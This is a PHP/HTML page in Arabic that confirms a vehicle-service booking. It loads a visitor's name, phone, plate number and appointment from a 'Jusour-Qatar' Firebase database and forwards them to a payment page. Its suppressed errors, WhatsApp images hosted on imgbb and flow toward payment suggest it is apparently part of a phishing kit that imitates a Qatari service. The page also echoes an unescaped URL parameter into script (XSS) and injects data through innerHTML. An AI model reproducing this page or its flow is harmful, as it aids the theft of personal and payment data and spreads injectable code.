<?php
error_reporting(0);
ini_set('display_errors', 0);
// استقبال رقم الجوال من الرابط لجلب بيانات العميل من فايربيس
$phone = $_GET['phone'];
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تأكيد بيانات الحجز</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        :root { --main-blue: #00acc1; --dark-blue: #2c3e50; --green-btn: #28a745; --bg-card: #f9f9f9; }
        body { font-family: 'Cairo', sans-serif; background-color: #fff; margin: 0; padding: 0; color: #333; }
        
        .header-img { width: 100%; display: block; }
        .container { max-width: 450px; margin: auto; padding: 20px; }

        .title-area { text-align: center; margin: 25px 0; }
        .title-area h2 { color: var(--dark-blue); font-size: 22px; font-weight: 800; border-bottom: 3px solid var(--main-blue); display: inline-block; padding-bottom: 8px; }

        /* كارت عرض البيانات */
        .info-card { 
            background: var(--bg-card); border: 1px solid #eee; border-radius: 15px; 
            padding: 10px 15px; margin-bottom: 30px; box-shadow: 0 4px 10px rgba(0,0,0,0.03);
        }
        .data-row { 
            display: flex; justify-content: space-between; align-items: center; 
            padding: 12px 0; border-bottom: 1px solid #ececec; 
        }
        .data-row:last-child { border-bottom: none; }
        .label { font-weight: 700; color: #777; font-size: 14px; }
        .value { color: var(--dark-blue); font-weight: 800; font-size: 14px; text-align: left; }

        .btns-container { display: flex; flex-direction: column; gap: 15px; margin-top: 20px; }
        
        .btn-confirm { 
            background: var(--green-btn); color: #fff; padding: 15px; border: none; 
            border-radius: 30px; font-size: 18px; font-weight: 800; cursor: pointer;
            box-shadow: 0 5px 15px rgba(40,167,69,0.3); transition: 0.3s;
        }
        .btn-edit { 
            background: #fff; color: #888; padding: 12px; border: 1.5px solid #ddd; 
            border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer;
            transition: 0.3s;
        }
        .btn-confirm:active, .btn-edit:active { transform: scale(0.96); }

        .footer-img { width: 100%; display: block; margin-top: 40px; }
        .loader { text-align: center; padding: 50px; color: var(--main-blue); font-weight: 700; }
    </style>
</head>
<body>

<img src="https://i.ibb.co/JRL1qXkP/Whats-App-Image-2024-09-05-at-8-51-55-AM.jpg" class="header-img">

<div class="container">
    <div class="title-area">
        <h2>تأكيد بيانات الحجز</h2>
    </div>

    <div id="displayArea">
        <div class="loader">جاري استرجاع بياناتك...</div>
    </div>

    <div class="btns-container">
        <button class="btn-confirm" onclick="actionConfirm()">تأكيد الحجز</button>
        <button class="btn-edit" onclick="actionEdit()">تعديل البيانات</button>
    </div>
</div>

<img src="https://i.ibb.co/b5LVtGWC/IMG-20260318-WA0002.jpg" class="footer-img">

<script>
// إعدادات Firebase لبروجكت Jusour-Qatar
const firebaseConfig = { 
    apiKey: "AIzaSyBRoLQJTQVVGiY9JmtaEFwAA", 
    databaseURL: "https://jusour-qatar-default-rtdb.firebaseio.com" 
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const userPhone = "<?php echo $phone; ?>";

// التحقق من وجود رقم الجوال
if (!userPhone) {
    alert("لم يتم العثور على جلسة حجز نشطة.");
    window.location.href = "booking.php";
}

// سحب البيانات من فايربيس لعرضها
db.ref('bookings/' + userPhone).once('value').then((snapshot) => {
    const data = snapshot.val();
    const area = document.getElementById('displayArea');
    
    if (data) {
        area.innerHTML = `
            <div class="info-card">
                <div class="data-row"><span class="label">الإسم:</span><span class="value">${data.personal_info.full_name}</span></div>
                <div class="data-row"><span class="label">رقم الجوال:</span><span class="value">${data.personal_info.phone}</span></div>
                <div class="data-row"><span class="label">رقم اللوحة:</span><span class="value" style="direction:ltr">${data.vehicle_info.plate_number}</span></div>
                <div class="data-row"><span class="label">مركز الخدمة:</span><span class="value">${data.vehicle_info.region}</span></div>
                <div class="data-row"><span class="label">الموعد:</span><span class="value">${data.vehicle_info.date} | ${data.vehicle_info.time}</span></div>
            </div>
        `;
    } else {
        area.innerHTML = `<div class="loader" style="color:red">نعتذر، لم نتمكن من العثور على بياناتك.</div>`;
    }
});

// وظيفة زر التعديل: العودة لصفحة إدخال البيانات (booking.php)
function actionEdit() {
    window.location.href = "booking.php?phone=" + userPhone;
}

// وظيفة زر التأكيد: الانتقال لصفحة الدفع (payment.php)
function actionConfirm() {
    window.location.href = "payment.php?phone=" + userPhone;
}
</script>
</body>
</html>